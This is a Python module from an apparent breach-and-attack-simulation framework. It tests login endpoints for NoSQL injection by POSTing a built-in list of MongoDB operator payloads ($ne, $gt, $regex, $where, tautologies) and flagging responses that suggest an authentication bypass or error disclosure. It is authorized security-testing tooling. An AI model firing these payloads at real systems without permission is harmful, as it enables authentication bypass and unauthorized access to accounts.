"""NoSQL Injection testing. MITRE ATT&CK: T1190"""
from __future__ import annotations
import uuid
from typing import Any
from bas.core.executor import AttackRequest, AttackResponse
from bas.core.scope import AuthorizationLevel
from bas.modules.base_module import BaseAttackModule, ModuleMetadata, ModuleResult, VulnStatus

DEFAULT_NOSQLI_PAYLOADS = [
    '{"$gt":""}', '{"$ne":"invalid"}', '{"$regex":".*"}', '{"$where":"1==1"}',
    '{"username":{"$ne":""},"password":{"$ne":""}}',
    '{"username":{"$gt":""},"password":{"$gt":""}}',
    "admin'||'1'=='1", '{"$or":[{},{"a":"a"}]}',
    '{"username":{"$regex":"admin.*"},"password":{"$ne":""}}',
    "true, $where: '1 == 1'", "';return true;var a='",
    '[$ne]=1', 'username[$ne]=toto&password[$ne]=toto',
]

class NoSQLiModule(BaseAttackModule):
    @property
    def metadata(self) -> ModuleMetadata:
        return ModuleMetadata(name="nosqli", description="NoSQL injection (MongoDB, CouchDB)", category="nosqli",
            mitre_technique_ids=["T1190"], mitre_technique_names=["Exploit Public-Facing Application"],
            auth_level_required=AuthorizationLevel.LOW_IMPACT, owasp_category="A03:2021 - Injection",
            cwe_ids=["CWE-943"], tags=["injection", "nosql", "mongodb"])

    async def _get_payloads(self, target: str, options: dict[str, Any]) -> list[str]:
        if self._payload_db:
            p = await self._payload_db.get_payloads("nosqli", limit=50)
            if p: return p
        return DEFAULT_NOSQLI_PAYLOADS

    def _build_requests(self, target: str, payloads: list[str], options: dict[str, Any]) -> list[AttackRequest]:
        requests = []
        path = options.get("path", "/api/login")
        for p in payloads:
            if p.startswith("{"):
                requests.append(AttackRequest(request_id=f"nosqli-{uuid.uuid4().hex[:8]}", target=target,
                    method="POST", path=path, body=p, content_type="application/json"))
            else:
                requests.append(AttackRequest(request_id=f"nosqli-{uuid.uuid4().hex[:8]}", target=target,
                    method="POST", path=path, body=p, content_type="application/x-www-form-urlencoded"))
        return requests

    def _analyze_response(self, request: AttackRequest, response: AttackResponse, payload: str) -> ModuleResult:
        body = response.body_text.lower()
        if response.status_code == 200 and any(k in body for k in ["token", "session", "welcome", "success", "authenticated"]):
            return ModuleResult(module_name="nosqli", target=request.target, status=VulnStatus.VULNERABLE,
                payload_used=payload, response_code=response.status_code, response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms, evidence="NoSQL injection: auth bypass with operator injection",
                severity="critical", mitre_technique_id="T1190")
        if any(k in body for k in ["mongoerror", "mongod", "bsonerror", "cast to objectid"]):
            return ModuleResult(module_name="nosqli", target=request.target, status=VulnStatus.POTENTIALLY_VULNERABLE,
                payload_used=payload, response_code=response.status_code, response_body_preview=response.body_text[:500],
                elapsed_ms=response.elapsed_ms, evidence="NoSQL error disclosure in response",
                severity="medium", mitre_technique_id="T1190")
        return ModuleResult(module_name="nosqli", target=request.target, status=VulnStatus.NOT_VULNERABLE,
            payload_used=payload, response_code=response.status_code, elapsed_ms=response.elapsed_ms)
